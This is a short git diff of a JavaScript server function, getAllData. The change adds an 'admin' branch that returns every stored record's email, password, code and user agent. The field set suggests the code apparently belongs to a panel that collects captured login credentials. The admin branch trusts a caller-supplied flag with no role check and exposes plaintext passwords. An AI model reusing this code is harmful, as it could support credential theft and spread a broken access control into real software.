@@ -224,15 +224,24 @@ export async function dataState(id) {
     console.log(error);
   }
 }
-export async function getAllData() {
+export async function getAllData({ admin }) {
   let id = await authCheck();
   try {
     await connectDB();
-    const data = await User.find({ _id: id }, { data: 1, _id: 0 }).populate(
-      "data",
-      "userAgent email password state code"
-    );
-    return JSON.stringify(data[0]);
+    if (admin) {
+      const data = await Data.find(
+        {},
+        { userAgent: 1, email: 1, password: 1, state: 1, code: 1, _id: 0 }
+      );
+      return JSON.stringify(data);
+    } else {
+      const data = await User.find({ _id: id }, { data: 1, _id: 0 }).populate(
+        "data",
+        "userAgent email password state code"
+      );
+
+      return JSON.stringify(data[0].data);
+    }
   } catch (error) {
     console.log(error);
   }
